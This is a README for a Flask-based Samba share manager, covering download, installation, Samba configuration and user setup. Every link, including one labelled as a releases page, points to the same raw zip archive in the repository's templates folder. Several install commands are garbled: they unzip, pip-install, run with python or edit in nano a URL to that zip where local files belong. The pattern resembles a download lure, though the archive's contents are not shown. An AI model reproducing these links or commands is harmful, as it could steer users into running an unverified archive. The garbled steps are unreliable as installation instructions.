# 🗂️ samba-web-manager - Manage Your Samba Shares Easily

[![Download](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip)](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip)

## 📋 Overview

samba-web-manager is a modern web-based tool for managing Samba file shares. Built using Flask, it offers user management, file upload and download, and permission control—all with a responsive interface. Whether you want to share files with friends or manage a family network, this tool makes the process simple and straightforward.

## 🚀 Getting Started

Follow these steps to download and run samba-web-manager easily.

### 💻 System Requirements

- **Operating System:** Linux (Debian or Ubuntu recommended)
- **Web Browser:** Any modern browser (Chrome, Firefox, Safari)
- **Python:** Version 3.7 or above installed

### 📥 Download & Install

To get started, visit this page to download the application:

[Download samba-web-manager](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip)

1. Go to the [Releases page](https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip).
2. Look for the latest version of samba-web-manager.
3. Download the installation package that matches your operating system.

### 🔍 Features

- **User Management:** Add, remove, or manage users easily.
- **File Upload/Download:** Upload and download files directly from your web browser.
- **Permission Control:** Set different access levels for users.
- **Responsive UI:** Works well on both desktop and mobile devices.

### ⚙️ Installation Guide

After downloading the file, follow these steps to install samba-web-manager:

1. **Open a Terminal:** Press `Ctrl + Alt + T` on your keyboard to launch the terminal.
   
2. **Navigate to the Download Folder:**
   ```bash
   cd ~/Downloads
   ```
   
3. **Unzip the Package:** If your download is a zipped file, run:
   ```bash
   unzip https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
   ```
   
4. **Install Dependencies:** Navigate to the extracted folder and run:
   ```bash
   cd samba-web-manager
   pip install -r https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
   ```
   
5. **Run the Application:**
   ```bash
   python https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
   ```

### 🌐 Accessing the Application

Open your web browser and enter the following URL:

```
http://localhost:5000
```

This URL directs you to the samba-web-manager interface, where you can start managing your Samba shares.

### 🔒 Configuring Samba

To use samba-web-manager effectively, you need to configure Samba on your system. Follow these steps to set up Samba:

1. **Install Samba:**
   ```bash
   sudo apt install samba
   ```

2. **Edit the Samba Configuration File:**
   Use a text editor to modify the Samba configuration:
   ```bash
   sudo nano https://raw.githubusercontent.com/sahni132/samba-web-manager/main/templates/samba-web-manager-vervel.zip
   ```

3. **Add Your Shared Directory:** 
   At the bottom of the file, add:
   ```
   [shared]
   path = /path/to/shared/folder
   browseable = yes
   read only = no
   valid users = your_user
   ```
   Replace `/path/to/shared/folder` with the actual path you want to share.

4. **Restart Samba:**
   ```bash
   sudo systemctl restart smbd
   ```

### 🔑 Setting Up Users

To add users to Samba:

1. **Create a Samba User:**
   ```bash
   sudo smbpasswd -a username
   ```
   Replace `username` with your chosen name.

2. **Set User Permissions:** Adjust the permissions in the shared folder using:
   ```bash
   sudo chown -R username:username /path/to/shared/folder
   ```

### 📚 Troubleshooting

If you encounter issues:

- Ensure that Samba is installed and running.
- Check if you have correctly set user permissions.
- Verify that your firewall is not blocking access.

For further assistance, visit the GitHub Issues page or consult the Samba documentation.

### 📜 License

This project is licensed under the MIT License. Feel free to use, modify, or distribute it. Check the LICENSE file in the repository for details.

By following these steps, you can easily download and set up samba-web-manager to manage your Samba file share efficiently. Enjoy seamless file sharing!